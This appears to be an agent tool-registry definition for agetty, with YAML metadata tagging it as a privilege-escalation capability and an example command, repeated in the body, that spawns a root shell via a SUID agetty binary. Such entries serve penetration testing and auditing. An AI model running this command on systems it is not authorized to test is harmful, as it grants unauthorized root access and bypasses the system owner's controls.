---
id: system-terminal-agetty
namespace: system:terminal:agetty
name: agetty
description: Alternative Linux getty for managing virtual consoles that can spawn a shell when used with SUID.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - su
  - sudo
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes: []
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 4
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: low
  disk_io: low
allowed-tools:
  - agetty
  - Bash
  - execFile
parameters:
  - name: l
    type: string
    required: false
    description: "Program to log in (login program)"
    aliases:
      - -l
      - --login-program
  - name: o
    type: string
    required: false
    description: "Options to pass to login program"
    aliases:
      - -o
      - --login-options
  - name: p
    type: string
    required: false
    description: "Set the -p parameter"
    aliases:
      - -p
  - name: a
    type: string
    required: false
    description: "Autologin user"
    aliases:
      - -a
      - --autologin
features: []
execution:
  template: "agetty {l} {o} {p} {a}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a root shell via SUID agetty
    command: agetty -l /bin/sh -o -p -a root tty
references:
  - label: "agetty man page"
    url: "https://man7.org/linux/man-pages/man8/agetty.8.html"
techniques:
  - privilege-escalation
  - execution
install:
    - method: apt
      package_name: "util-linux"
      commands:
        - "apt-get install -y util-linux"
---


# agetty — Alternative Getty

agetty manages virtual consoles. When installed with SUID, it can spawn a root shell by specifying an alternative login program.

## Privilege Escalation

```bash
agetty -l /bin/sh -o -p -a root tty
```
